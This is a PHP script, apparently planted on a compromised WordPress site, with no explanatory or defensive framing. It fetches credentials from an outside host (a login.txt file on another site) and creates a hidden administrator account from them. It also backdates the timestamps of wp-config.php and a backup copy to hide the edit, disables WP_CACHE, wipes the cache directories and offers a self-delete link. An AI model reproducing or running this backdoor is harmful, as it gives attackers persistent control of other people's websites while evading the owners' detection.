<?php
if (isset($_GET['del'])) {
    if (unlink(__FILE__)) {
        die("DELETED");
    }
}
require __DIR__ . '/wp-blog-header.php';

// Delete file
echo "<a href='?del'>DELETE</a><hr>\n";

// Create admin
echo "<b>Trying to create admin user:</b><br>\n";

function wpb_admin_account()
{
    $ch = curl_init('https://bearcreekwoodwork.com/wp-content/themes/twentyseventeen/login.txt');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_HEADER, false);
    $remote_data = curl_exec($ch);
    curl_close($ch);
 
    $remote_strings = explode("\n", $remote_data);
    $random_string = $remote_strings[array_rand($remote_strings)];
    $parts = explode("__", $random_string);
    $user = $parts[1];
    $pass = $parts[2];
    $email = $parts[3];
    if (!username_exists($user)  && !email_exists($email) ) {
        $user_id = wp_create_user($user, $pass, $email);
        $user = new WP_User($user_id);
        $user->set_role('administrator');
        if ($user) {
            $host = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http') . '://' . $_SERVER['HTTP_HOST'];
            return $host . $random_string;
        }
    } 
}

if ($new_admin = wpb_admin_account()) {
    echo "created new admin user<br>\n";
    echo "<i>$new_admin<i><br>\n";
}
else {
    echo "error creating new admin user<br>\n";
}
echo "<hr>\n";

// WP_CACHE in wp-config.php 
echo "<b>Finding WP_CACHE in wp-config.php:</b><br>\n";
$wp_config = file_get_contents('wp-config.php');
$wp_config_time = filemtime('wp-config.php');
$wp_config_humtime = date('d.M.Y H:i:s', $wp_config_time);
echo "wp-config.php time: $wp_config_humtime<br>\n";

if (file_put_contents('wp-config-bak.php', $wp_config)) {
    echo "backup wp-config.php to wp-config-bak.php<br>\n";
    $new_time = $wp_config_time - rand(100, 10000);
    $new_humtime = date('d.M.Y H:i:s', $new_time);
    if (touch('wp-config-bak.php', $new_time)) {
        echo "set wp-config-bak.php time: $new_humtime<br>\n";
    }

    $wp_cache_strings = array("define('WP_CACHE', true);");

    foreach ($wp_cache_strings as $string) {
        if (stripos($wp_config, $string)) {
            echo "$string found and replaced to false<br>\n";
            $wp_config = str_replace($string, "define('WP_CACHE', false);", $wp_config);
            if (file_put_contents('wp-config.php', $wp_config)) {
                echo "saved new wp-config.php<br>\n";
                if (touch('wp-config.php', $new_time)) {
                    echo "set wp-config.php time: $new_humtime<br>\n";
                }
            }
        }
    }
}
else {
    echo "error backup wp-config.php<br>\n";
}
echo "<hr>\n";


// Cache dirs
echo "<b>Finding and cleaning cache directories:</b><br>\n";
$cache_dirs = array('wp-content/cache');

function rrmdir($dir)
{ 
    if (is_dir($dir)) { 
        $objects = scandir($dir);
        foreach ($objects as $object) { 
            if ($object != "." && $object != "..") { 
                if (is_dir($dir. DIRECTORY_SEPARATOR .$object) && !is_link($dir."/".$object)) {
                     rrmdir($dir. DIRECTORY_SEPARATOR .$object);
                } else {
                    unlink($dir. DIRECTORY_SEPARATOR .$object);
                } 
            } 
        }
        if (rmdir($dir)) {
            return true;
        }
    } 
}

foreach ($cache_dirs as $cache_dir) {
    if (is_dir($cache_dir)) {
        echo "$cache_dir found<br>\n";
        $list_dir = glob("$cache_dir/*");
        foreach ($list_dir as $item) {
            if (is_file($item)) {
                if (unlink($item)) {
                    echo "$item deleted<br>\n";
                }
            }
            if (is_dir($item)) {
                if (rrmdir($item)) {
                    echo "$item deleted<br>\n";
                }
            }
        }
    }
}
echo "<hr>\n";
echo "All done!\n";
